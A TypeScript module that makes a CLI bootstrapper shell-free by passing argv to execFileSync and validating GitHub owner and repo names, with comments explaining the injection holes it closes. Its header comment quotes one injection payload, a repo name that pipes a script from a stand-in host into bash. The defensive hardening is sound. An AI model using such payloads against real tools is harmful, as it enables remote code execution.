/**
 * Shell-free command execution for the bootstrapper commands.
 *
 * Why this module exists:
 *
 * The setup commands prompt for values (GitHub org, repo name, GitLab project
 * path) and then build AWS CLI invocations from them. The original helpers
 * interpolated those values into a command *string* and handed it to
 * execSync, which spawns a shell -- `/bin/bash` in setup-github-oidc, `/bin/sh`
 * by default everywhere else. Either way the prompt answer is parsed as shell
 * source, so a repo name of `x; curl evil.sh | bash` executes.
 *
 * There was a second, quieter hole in the same call sites. The IAM trust and
 * inline policy documents were embedded as `--policy-document '${json}'`,
 * relying on single quotes to protect a JSON blob that itself contains the
 * prompt answers. A single apostrophe in an org name terminates that quoted
 * region early and everything after it becomes shell syntax. Shell-quoting a
 * value that is interpolated into a larger quoted string is a losing game:
 * the escaping has to be correct at every nesting level, forever.
 *
 * Passing argv directly removes the shell from the picture entirely, so there
 * is no metacharacter layer left to escape. That also means JSON documents
 * need no outer quoting -- each is exactly one argv element, however many
 * spaces, quotes, or newlines it contains.
 *
 * Consequence for callers: there is no shell, so shell features do not work.
 * No pipes, globs, `&&`, redirection, or `$VAR` expansion. Anything that
 * needs those must be expressed in TypeScript instead -- which is the point,
 * since each of those was also an injection vector.
 */

import { execFileSync } from 'node:child_process';

export interface RunResult {
  ok: boolean;
  stdout: string;
  stderr: string;
}

/**
 * Runs `file` with `args` and no shell.
 *
 * Each element of `args` is passed to the process verbatim, so callers must
 * split their own arguments -- `run('aws', ['iam', 'get-role', '--role-name',
 * name])`, never `run('aws', ['iam get-role --role-name ' + name])`. The
 * latter would arrive as a single argument and the command would fail, which
 * is a loud failure rather than a silent injection.
 *
 * Never throws: a non-zero exit, a missing binary, and a signal kill all come
 * back as `ok: false`. Callers branch on `ok` and surface `stderr`.
 */
export function run(file: string, args: string[]): RunResult {
  try {
    const stdout = execFileSync(file, args, {
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
      env: process.env,
    }).trim();
    return { ok: true, stdout, stderr: '' };
  } catch (err: any) {
    return { ok: false, stdout: '', stderr: (err.stderr || err.message || '').trim() };
  }
}

/**
 * Like run(), but inherits stdio so the child can drive the terminal.
 *
 * Needed for `codeburn sync setup`, which opens a browser and prints an OIDC
 * prompt the user has to see and answer. Returns whether the child exited 0.
 */
export function runInteractive(file: string, args: string[]): boolean {
  try {
    execFileSync(file, args, { stdio: 'inherit', env: process.env });
    return true;
  } catch {
    return false;
  }
}

/**
 * GitHub owner (user or org) names: alphanumerics and hyphens, no leading or
 * trailing hyphen, 39 characters max.
 *
 * Deliberately looser than GitHub's current signup rule, which forbids
 * consecutive hyphens. That rule postdates a lot of accounts, so grandfathered
 * owners containing `--` still exist and IAM role names accept them fine.
 * Rejecting one would block a legitimate user for no security gain -- the
 * shell-injection boundary is run() not using a shell, not this pattern.
 */
const GITHUB_OWNER = /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,37}[A-Za-z0-9])?$/;

/**
 * GitHub repository names: alphanumerics plus `.`, `_`, `-`, 100 chars max.
 * `.` and `..` are reserved by git.
 */
const GITHUB_REPO = /^[A-Za-z0-9._-]{1,100}$/;

/**
 * Validates a prompt answer against `pattern`, exiting with a readable
 * message rather than letting a malformed value reach the AWS CLI.
 *
 * This is not what closes the injection -- run() does that by not using a
 * shell. It is here because IAM role names are constructed from these values
 * and accept only `[\w+=,.@-]`, so a value with a slash or a space produces a
 * ValidationException from AWS that reads nothing like "your input was
 * rejected". Failing at the prompt names the actual problem.
 */
export function validateOrExit(value: string, label: string, kind: 'owner' | 'repo'): string {
  const pattern = kind === 'owner' ? GITHUB_OWNER : GITHUB_REPO;
  if (!pattern.test(value) || value === '.' || value === '..') {
    console.error(`Error: ${label} "${value}" is not a valid GitHub ${kind} name.`);
    console.error(
      kind === 'owner'
        ? '  Expected letters, digits, and single hyphens (max 39 characters).'
        : '  Expected letters, digits, dots, underscores, and hyphens (max 100 characters).',
    );
    process.exit(1);
  }
  return value;
}
